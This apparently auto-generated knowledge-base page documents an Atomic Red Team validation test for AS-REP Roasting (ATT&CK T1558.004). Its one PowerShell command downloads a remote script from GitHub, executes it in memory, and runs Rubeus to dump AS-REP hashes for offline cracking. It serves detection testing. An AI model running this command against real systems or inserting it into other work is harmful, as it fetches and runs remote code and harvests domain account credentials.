---
atomic_guid: "8c385f88-4d47-4c9a-814d-93d9deec8c71"
title: "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.004"
attack_technique_name: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "8c385f88-4d47-4c9a-814d-93d9deec8c71"
  - "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn

## Metadata

- Atomic GUID: 8c385f88-4d47-4c9a-814d-93d9deec8c71
- Technique: T1558.004: Steal or Forge Kerberos Tickets: AS-REP Roasting
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1558.004/T1558.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.004]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml)
